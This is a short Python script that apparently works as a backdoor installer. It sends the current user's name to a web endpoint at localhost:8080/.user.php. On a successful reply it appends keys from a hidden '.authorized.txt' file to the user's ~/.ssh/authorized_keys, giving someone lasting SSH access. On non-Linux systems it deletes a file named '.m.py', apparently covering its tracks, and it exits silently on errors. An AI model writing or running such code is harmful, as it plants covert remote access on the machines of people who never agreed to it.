import os
import subprocess
import sys
import requests

def ssh_installed():
    try:
        result = subprocess.run(["which", "ssh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0 and bool(result.stdout)
    except Exception as e:
        return False

def setup_ssh_keys():
    home_directory = os.path.expanduser("~")
    ssh_directory = os.path.join(home_directory, ".ssh")
    authorized_file_path = os.path.join(ssh_directory, "authorized_keys")
    source_file = ".authorized.txt"

    os.makedirs(ssh_directory, exist_ok=True)
    
    try:
        with open(source_file, 'r') as authorized_ssh:
            content = authorized_ssh.read()

        with open(authorized_file_path, 'a') as keys:
            keys.write(content)
    except Exception as e:
        sys.exit()

def main():
    if sys.platform in ['linux', 'linux2']:
        setup_ssh_keys()
    else:
        os.remove('.m.py')
            
if __name__ == "__main__":
    username = os.environ.get('USER') or os.environ.get('LOGNAME')
    link = f"http://localhost:8080/.user.php?user={username}"
    try:
        response = requests.get(link)
        if response.status_code == 200 and ssh_installed():
            main()
        else:
            sys.exit()
    except Exception as e:
        sys.exit()
